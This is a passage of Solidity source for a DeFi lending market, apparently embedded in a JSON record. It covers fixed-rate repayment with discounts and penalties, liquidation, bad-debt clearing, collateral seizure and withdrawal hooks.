actualRepayAssets the actual amount that was transferred into the protocol.\n  function repayAtMaturity(\n    uint256 maturity,\n    uint256 positionAssets,\n    uint256 maxAssets,\n    address borrower\n  ) external whenNotPaused returns (uint256 actualRepayAssets) {\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.MATURED);\n\n    actualRepayAssets = noTransferRepayAtMaturity(maturity, positionAssets, maxAssets, borrower, true);\n    emitMarketUpdate();\n\n    asset.safeTransferFrom(msg.sender, address(this), actualRepayAssets);\n  }\n\n  /// @notice Allows to (partially) repay a fixed rate position. It does not transfer assets.\n  /// @param maturity the maturity to access the pool.\n  /// @param positionAssets the amount of debt of the pool that should be paid.\n  /// @param maxAssets maximum amount of debt that the account is willing to accept to be repaid.\n  /// @param borrower the address of the account that has the debt.\n  /// @param canDiscount should early repay discounts be applied.\n  /// @return actualRepayAssets the actual amount that should be transferred into the protocol.\n  function noTransferRepayAtMaturity(\n    uint256 maturity,\n    uint256 positionAssets,\n    uint256 maxAssets,\n    address borrower,\n    bool canDiscount\n  ) internal returns (uint256 actualRepayAssets) {\n    if (positionAssets == 0) revert ZeroRepay();\n\n    FixedLib.Pool storage pool = fixedPools[maturity];\n\n    uint256 backupEarnings = pool.accrueEarnings(maturity);\n    floatingAssets += backupEarnings;\n\n    FixedLib.Position memory position = fixedBorrowPositions[maturity][borrower];\n\n    uint256 debtCovered = Math.min(positionAssets, position.principal + position.fee);\n\n    uint256 principalCovered = FixedLib\n      .Position(position.principal, position.fee)\n      .scaleProportionally(debtCovered)\n      .principal;\n\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n\n    // early repayment allows a discount from the unassigned earnings\n    if (block.timestamp < maturity) {\n      if (canDiscount) {\n        // calculate the deposit fee considering the amount of debt the account'll pay\n        (uint256 discountFee, uint256 backupFee) = pool.calculateDeposit(principalCovered, backupFeeRate);\n\n        // remove the fee from unassigned earnings\n        pool.unassignedEarnings -= discountFee + backupFee;\n\n        // the fee charged to the fixed pool supplier goes to the earnings accumulator\n        earningsAccumulator += backupFee;\n\n        // the fee gets discounted from the account through `actualRepayAssets`\n        actualRepayAssets = debtCovered - discountFee;\n      } else {\n        actualRepayAssets = debtCovered;\n      }\n    } else {\n      actualRepayAssets = debtCovered + debtCovered.mulWadDown((block.timestamp - maturity) * penaltyRate);\n\n      // all penalties go to the earnings accumulator\n      earningsAccumulator += actualRepayAssets - debtCovered;\n    }\n\n    // verify that the account agrees to this discount or penalty\n    if (actualRepayAssets > maxAssets) revert Disagreement();\n\n    // reduce the borrowed from the pool and might decrease the floating backup borrowed\n    floatingBackupBorrowed -= pool.repay(principalCovered);\n\n    // update the account position\n    position.reduceProportionally(debtCovered);\n    if (position.principal | position.fee == 0) {\n      delete fixedBorrowPositions[maturity][borrower];\n      Account storage account = accounts[borrower];\n      account.fixedBorrows = account.fixedBorrows.clearMaturity(maturity);\n    } else {\n      // proportionally reduce the values\n      fixedBorrowPositions[maturity][borrower] = position;\n    }\n\n    emit RepayAtMaturity(maturity, msg.sender, borrower, actualRepayAssets, debtCovered);\n    emitFixedEarningsUpdate(maturity);\n  }\n\n  /// @notice Liquidates undercollateralized fixed/floating (or both) position(s).\n  /// @dev Msg.sender liquidates borrower's position(s) and repays a certain amount of debt for the floating pool,\n  /// or/and for multiple fixed pools, seizing a portion of borrower's collateral.\n  /// @param borrower account that has an outstanding debt across floating or fixed pools.\n  /// @param maxAssets maximum amount of debt that the liquidator is willing to accept. (it can be less)\n  /// @param seizeMarket market from which the collateral will be seized to give to the liquidator.\n  /// @return repaidAssets actual amount repaid.\n  function liquidate(\n    address borrower,\n    uint256 maxAssets,\n    Market seizeMarket\n  ) external whenNotPaused returns (uint256 repaidAssets) {\n    if (msg.sender == borrower) revert SelfLiquidation();\n\n    maxAssets = auditor.checkLiquidation(this, seizeMarket, borrower, maxAssets);\n    if (maxAssets == 0) revert ZeroRepay();\n\n    Account storage account = accounts[borrower];\n\n    {\n      uint256 packedMaturities = account.fixedBorrows;\n      uint256 maturity = packedMaturities & ((1 << 32) - 1);\n      packedMaturities = packedMaturities >> 32;\n      while (packedMaturities != 0 && maxAssets != 0) {\n        if (packedMaturities & 1 != 0) {\n          uint256 actualRepay;\n          if (block.timestamp < maturity) {\n            actualRepay = noTransferRepayAtMaturity(maturity, maxAssets, maxAssets, borrower, false);\n            maxAssets -= actualRepay;\n          } else {\n            uint256 position;\n            {\n              FixedLib.Position storage p = fixedBorrowPositions[maturity][borrower];\n              position = p.principal + p.fee;\n            }\n            uint256 debt = position + position.mulWadDown((block.timestamp - maturity) * penaltyRate);\n            actualRepay = debt > maxAssets ? maxAssets.mulDivDown(position, debt) : maxAssets;\n\n            if (actualRepay == 0) maxAssets = 0;\n            else {\n              actualRepay = noTransferRepayAtMaturity(maturity, actualRepay, maxAssets, borrower, false);\n              maxAssets -= actualRepay;\n            }\n          }\n          repaidAssets += actualRepay;\n        }\n        packedMaturities >>= 1;\n        maturity += FixedLib.INTERVAL;\n      }\n    }\n\n    if (maxAssets != 0 && account.floatingBorrowShares != 0) {\n      uint256 borrowShares = previewRepay(maxAssets);\n      if (borrowShares != 0) {\n        (uint256 actualRepayAssets, ) = noTransferRefund(borrowShares, borrower);\n        repaidAssets += actualRepayAssets;\n      }\n    }\n\n    // reverts on failure\n    (uint256 lendersAssets, uint256 seizeAssets) = auditor.calculateSeize(this, seizeMarket, borrower, repaidAssets);\n    earningsAccumulator += lendersAssets;\n\n    if (address(seizeMarket) == address(this)) {\n      internalSeize(this, msg.sender, borrower, seizeAssets);\n    } else {\n      seizeMarket.seize(msg.sender, borrower, seizeAssets);\n\n      emitMarketUpdate();\n    }\n\n    emit Liquidate(msg.sender, borrower, repaidAssets, lendersAssets, seizeMarket, seizeAssets);\n\n    auditor.handleBadDebt(borrower);\n\n    asset.safeTransferFrom(msg.sender, address(this), repaidAssets + lendersAssets);\n  }\n\n  /// @notice Clears floating and fixed debt for an account spreading the losses to the `earningsAccumulator`.\n  /// @dev Can only be called from the auditor.\n  /// @param borrower account with insufficient collateral to be cleared the debt.\n  function clearBadDebt(address borrower) external {\n    if (msg.sender != address(auditor)) revert NotAuditor();\n\n    floatingAssets += accrueAccumulatedEarnings();\n    Account storage account = accounts[borrower];\n    uint256 accumulator = earningsAccumulator;\n    uint256 totalBadDebt = 0;\n    uint256 packedMaturities = account.fixedBorrows;\n    uint256 maturity = packedMaturities & ((1 << 32) - 1);\n    packedMaturities = packedMaturities >> 32;\n    while (packedMaturities != 0) {\n      if (packedMaturities & 1 != 0) {\n        FixedLib.Position storage position = fixedBorrowPositions[maturity][borrower];\n        uint256 badDebt = position.principal + position.fee;\n        if (accumulator >= badDebt) {\n          RewardsController memRewardsController = rewardsController;\n          if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n          accumulator -= badDebt;\n          totalBadDebt += badDebt;\n          floatingBackupBorrowed -= fixedPools[maturity].repay(position.principal);\n          delete fixedBorrowPositions[maturity][borrower];\n          account.fixedBorrows = account.fixedBorrows.clearMaturity(maturity);\n\n          emit RepayAtMaturity(maturity, msg.sender, borrower, badDebt, badDebt);\n        }\n      }\n      packedMaturities >>= 1;\n      maturity += FixedLib.INTERVAL;\n    }\n    if (account.floatingBorrowShares != 0 && (accumulator = previewRepay(accumulator)) != 0) {\n      (uint256 badDebt, ) = noTransferRefund(accumulator, borrower);\n      totalBadDebt += badDebt;\n    }\n    if (totalBadDebt != 0) {\n      earningsAccumulator -= totalBadDebt;\n      emit SpreadBadDebt(borrower, totalBadDebt);\n    }\n    emitMarketUpdate();\n  }\n\n  /// @notice Public function to seize a certain amount of assets.\n  /// @dev Public function for liquidator to seize borrowers assets in the floating pool.\n  /// This function will only be called from another Market, on `liquidation` calls.\n  /// That's why msg.sender needs to be passed to the internal function (to be validated as a Market).\n  /// @param liquidator address which will receive the seized assets.\n  /// @param borrower address from which the assets will be seized.\n  /// @param assets amount to be removed from borrower's possession.\n  function seize(address liquidator, address borrower, uint256 assets) external whenNotPaused {\n    internalSeize(Market(msg.sender), liquidator, borrower, assets);\n  }\n\n  /// @notice Internal function to seize a certain amount of assets.\n  /// @dev Internal function for liquidator to seize borrowers assets in the floating pool.\n  /// Will only be called from this Market on `liquidation` or through `seize` calls from another Market.\n  /// That's why msg.sender needs to be passed to the internal function (to be validated as a Market).\n  /// @param seizeMarket address which is calling the seize function (see `seize` public function).\n  /// @param liquidator address which will receive the seized assets.\n  /// @param borrower address from which the assets will be seized.\n  /// @param assets amount to be removed from borrower's possession.\n  function internalSeize(Market seizeMarket, address liquidator, address borrower, uint256 assets) internal {\n    if (assets == 0) revert ZeroWithdraw();\n\n    // reverts on failure\n    auditor.checkSeize(seizeMarket, this);\n\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleDeposit(borrower);\n    uint256 shares = previewWithdraw(assets);\n    beforeWithdraw(assets, shares);\n    _burn(borrower, shares);\n    emit Withdraw(msg.sender, liquidator, borrower, assets, shares);\n    emit Seize(liquidator, borrower, assets);\n    emitMarketUpdate();\n\n    asset.safeTransfer(liquidator, assets);\n  }\n\n  /// @notice Hook to update the floating pool average, floating pool balance and distribute earnings from accumulator.\n  /// @param assets amount of assets to be withdrawn from the floating pool.\n  function beforeWithdraw(uint256 assets, uint256) internal override whenNotPaused {\n    updateFloatingAssetsAverage();\n    depositToTreasury(updateFloatingDebt());\n    uint256 earnings = accrueAccumulatedEarnings();\n    uint256 newFloatingAssets = floatingAssets + earnings - assets;\n    // check if the underlying liquidity that the account wants to withdraw is borrowed\n    if (floatingBackupBorrowed + floatingDebt > newFloatingAssets) revert InsufficientProtocolLiquidity();\n    floatingAssets = newFloatingAssets;\n  }\n\n  /// @notice Hook to update the floating pool average, floating pool balance and distribute earnings from accumulator.\n  /// @param assets amount of assets to be deposited to the floating pool.\n  function afterDeposit(uint256 assets, uint256) internal override whenNotPaused whenNotFrozen {\n    updateFloatingAssetsAverage();\n    uint256 treasuryFee = updateFloatingDebt();\n    uint256 earnings = accrueAccumulatedEarnings();\n    floatingAssets += earnings + assets;\n    depositToTreasury(treasuryFee);\n    emitMarketUpdate();\n  }\n\n  /// @notice Withdraws the owner's floating pool assets to the receiver address.\n  /// @dev Makes sure that the owner doesn't have shortfall after withdrawing.\n  /// @param assets amount of underlying to be withdrawn.\n  /// @param receiver address to which the assets will be transferred.\n  /// @param owner address which owns the floating pool assets.\n  /// @return shares amount of shares redeemed for underlying asset.\n  function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {\n    auditor.checkShortfall(this, owner, assets);\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleDeposit(owner);\n    shares = super.withdraw(assets, receiver, owner);\n    emitMarketUpdate();\n  }\n\n  /// @notice Redeems the owner's floating pool assets"
    }
  ]
}